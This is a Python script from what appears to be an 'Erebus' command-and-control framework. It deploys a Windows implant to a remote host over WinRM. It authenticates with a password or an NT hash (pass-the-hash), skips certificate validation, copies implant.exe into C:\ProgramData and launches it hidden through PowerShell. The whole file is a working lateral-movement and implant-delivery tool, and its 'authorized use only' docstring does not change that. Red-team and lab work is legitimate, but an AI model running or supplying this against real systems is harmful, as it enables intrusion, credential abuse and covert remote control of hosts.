#!/usr/bin/env python3
"""Deploy a Windows Erebus implant via WinRM (password or NT hash).

Lab / authorized use only. Prefer secrets from files (never bash $$ passwords).

Examples:
  python3 scripts/deploy_winrm.py --host 10.10.10.10 --user Administrator \\
      --pass-file /tmp/pass.txt --implant build/implant.exe

  python3 scripts/deploy_winrm.py --host 10.10.10.10 --user msa_health$ --domain LOGGING \\
      --hash-file /tmp/nt.txt --implant build/implant.exe \\
      --remote 'C:\\\\ProgramData\\\\erebus_svc.exe'
"""

from __future__ import annotations

import argparse
import os
import sys


def main() -> int:
    p = argparse.ArgumentParser(description="Upload + start Windows implant over WinRM")
    p.add_argument("--host", required=True)
    p.add_argument("--user", required=True)
    p.add_argument("--domain", default="")
    p.add_argument("--pass-file", help="File containing password (raw bytes/text)")
    p.add_argument("--password", help="Password (avoid if it contains $)")
    p.add_argument("--hash-file", help="File containing NT hash (32 hex) or LM:NT")
    p.add_argument("--hash", help="NT hash hex")
    p.add_argument("--implant", required=True, help="Path to implant.exe")
    p.add_argument("--remote", default=r"C:\ProgramData\erebus_svc.exe")
    p.add_argument("--ssl", action="store_true", help="Use HTTPS WinRM (5986)")
    args = p.parse_args()

    if not os.path.isfile(args.implant):
        print(f"implant not found: {args.implant}", file=sys.stderr)
        return 1

    password = None
    if args.pass_file:
        password = open(args.pass_file, "r", encoding="utf-8").read().rstrip("\n")
    elif args.password is not None:
        password = args.password
    elif args.hash_file:
        h = open(args.hash_file, "r", encoding="utf-8").read().strip()
        if ":" not in h:
            h = f"aad3b435b51404eeaad3b435b51404ee:{h}"
        password = h
    elif args.hash:
        h = args.hash.strip()
        if ":" not in h:
            h = f"aad3b435b51404eeaad3b435b51404ee:{h}"
        password = h
    else:
        print("need --pass-file/--password or --hash-file/--hash", file=sys.stderr)
        return 1

    user = args.user
    if args.domain and "\\" not in user and "@" not in user:
        user = f"{args.domain}\\{user}"

    try:
        from pypsrp.client import Client
    except ImportError:
        print("pypsrp required: pip install pypsrp", file=sys.stderr)
        return 1

    auth = "ntlm"
    c = Client(
        args.host,
        username=user,
        password=password,
        ssl=args.ssl,
        auth=auth,
        encryption="auto",
        cert_validation=False,
    )

    print(f"[*] uploading {args.implant} -> {args.remote}")
    c.copy(args.implant, args.remote)
    print("[*] starting process")
    # Escape single quotes for PowerShell
    remote = args.remote.replace("'", "''")
    ps = (
        f"if (-not (Test-Path '{remote}')) {{ throw 'missing implant' }}; "
        f"Start-Process -FilePath '{remote}' -WindowStyle Hidden; "
        f"Start-Sleep -Seconds 1; "
        f"Get-Item '{remote}' | Select-Object FullName,Length,LastWriteTime | Format-List | Out-String"
    )
    out, streams, _ = c.execute_ps(ps)
    print(out)
    if streams and streams.error:
        for e in streams.error:
            print("ERR:", e, file=sys.stderr)
            return 1
    print("[+] deploy issued — check: erebus op sessions")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
